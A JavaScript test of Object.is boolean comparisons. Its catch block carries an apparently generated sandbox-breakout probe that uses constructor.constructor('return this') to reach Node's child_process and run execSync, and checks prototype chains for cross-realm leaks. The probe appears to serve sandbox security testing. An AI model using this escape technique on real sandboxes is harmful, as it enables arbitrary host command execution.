try {
    assert.sameValue(Object.is(true, false), false, '`Object.is(true, false)` returns `false`');
    assert.sameValue(Object.is(false, true), false, '`Object.is(false, true)` returns `false`');
    assert.sameValue(Object.is(true, 1), false, '`Object.is(true, 1)` returns `false`');
    assert.sameValue(Object.is(false, 0), false, '`Object.is(false, 0)` returns `false`');
    assert.sameValue(Object.is(true, {}), false, '`Object.is(true, {})` returns `false`');
    assert.sameValue(Object.is(true, undefined), false, '`Object.is(true, undefined)` returns `false`');
    assert.sameValue(Object.is(false, undefined), false, '`Object.is(false, undefined)` returns `false`');
    assert.sameValue(Object.is(true, null), false, '`Object.is(true, null)` returns `false`');
    assert.sameValue(Object.is(false, null), false, '`Object.is(false, null)` returns `false`');
    assert.sameValue(Object.is(true, NaN), false, '`Object.is(true, NaN)` returns `false`');
    assert.sameValue(Object.is(false, NaN), false, '`Object.is(false, NaN)` returns `false`');
    assert.sameValue(Object.is(true, ''), false, '`Object.is(true, \'\')` returns `false`');
    assert.sameValue(Object.is(false, ''), false, '`Object.is(false, \'\')` returns `false`');
    assert.sameValue(Object.is(true, []), false, '`Object.is(true, [])` returns `false`');
    assert.sameValue(Object.is(false, []), false, '`Object.is(false, [])` returns `false`');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}